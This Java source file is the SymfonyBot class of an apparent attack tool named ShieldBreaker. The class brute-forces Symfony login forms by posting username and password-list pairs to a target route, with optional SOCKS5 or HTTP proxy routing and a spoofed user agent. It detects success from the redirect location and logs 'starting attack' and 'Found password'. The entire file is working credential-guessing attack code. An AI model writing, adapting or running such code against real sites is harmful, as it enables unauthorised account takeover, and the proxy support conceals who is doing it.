package com.shieldbreaker.symfonyplugin;

import com.shieldbreaker.bot.Bot;
import com.shieldbreaker.bot.BotManager;
import com.shieldbreaker.kernel.ShieldBreaker;
import com.shieldbreaker.symfonyplugin.exceptions.InvalidHTTPStatusCodeException;
import com.shieldbreaker.symfonyplugin.customHttpClients.BaseCustomHttpClient;
import com.shieldbreaker.symfonyplugin.customHttpClients.DefaultHttpClient;
import com.shieldbreaker.symfonyplugin.customHttpClients.HttpHttpClient;
import com.shieldbreaker.symfonyplugin.customHttpClients.Socks5HttpClient;
import org.apache.http.HttpHost;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.*;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class SymfonyBot extends Bot {
    public SymfonyBot(BotManager manager, List<String> passwords) {
        super(manager, passwords);
    }

    @Override
    public void run() {
        try {
            String domain = parametersManager.getDOMAIN();
            String cookie = parametersManager.getCOOKIE();
            String username = parametersManager.getACCOUNT();
            String trialRoute = parametersManager.getValue("trialRoute");
            String failureRoute = parametersManager.getValue("failureRoute");
            String socksProxyAddress = parametersManager.getValue("socksProxy");
            String httpProxyAddress = parametersManager.getValue("httpProxy");
            String protocol = parametersManager.getValue("protocol");
            String userAgent = parametersManager.getValue("userAgent");
            int port = Integer.parseInt(parametersManager.getValue("port"));

            //Setup custom httpClient
            BaseCustomHttpClient httpClient;

            if (!socksProxyAddress.isEmpty()) {             //SOCKS5 PROXY
                httpClient = new Socks5HttpClient(socksProxyAddress);
            } else if (!httpProxyAddress.isEmpty()) {       //HTTP PROXY
                httpClient = new HttpHttpClient(httpProxyAddress);
            } else {                                        //NO PROXY
                httpClient = new DefaultHttpClient();
            }

            //Setup target host
            HttpHost target = new HttpHost(domain, port, protocol);

            //Check for domain existence
            HttpHead HeadReq = new HttpHead("/");
            HeadReq.setHeader("Cookie", cookie);

            try {
                httpClient.execute(target, HeadReq).close();
                shieldBreaker.out("The domains seems to exists: starting attack.", ShieldBreaker.OUT_PRIORITY.MEDIUM);
            } catch (IOException e) {
                throw new Exception("The domain seems not to exists, or is not reachable (check protocol, port, network and server restrictions).");
            }

            //Setup global post query
            HttpPost post = new HttpPost(trialRoute);
            post.setHeader("User-Agent", userAgent);
            post.setHeader("Cookie", cookie);

            List<NameValuePair> nameValuePairs;

            //Crossing through each line (password)
            int size = passwords.size();
            for (int i = 0; i < size && !manager.isFound(); i++) {
                String password = passwords.get(i);
                shieldBreaker.out("Checking for: " + username + " | " + password, ShieldBreaker.OUT_PRIORITY.MEDIUM);

                nameValuePairs = new ArrayList<>();
                nameValuePairs.add(new BasicNameValuePair("_username", username));
                nameValuePairs.add(new BasicNameValuePair("_password", passwords.get(i)));

                try {
                    //Test credentials
                    post.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                    CloseableHttpResponse response = httpClient.execute(target, post);
                    response.close();
                    if (response.getStatusLine().getStatusCode() == 501)
                        throw new InvalidHTTPStatusCodeException();
                    String redirectURL = response.getHeaders("Location")[0].getValue();

                    //Check if credentials were found
                    if (!redirectURL.equals(protocol+ "://" + domain + failureRoute)) {
                        manager.setFound(true);
                        shieldBreaker.out("Found password: " + password, ShieldBreaker.OUT_PRIORITY.IMPORTANT);
                    }

                } catch (Exception e) {
                    shieldBreaker.err("An error occurred for those credentials (" + username + " | " + password + "). ", ShieldBreaker.OUT_PRIORITY.MEDIUM);
                    if (e instanceof InvalidHTTPStatusCodeException) {
                        httpClient.close();
                        throw e;
                    }

                    //System.err.println("Trying again");
                    //i--;
                }
                doneCheck();
            }

            httpClient.close();

        } catch (Exception e) {
            shieldBreaker.err(e.getMessage(), ShieldBreaker.OUT_PRIORITY.IMPORTANT);
        }

    }

}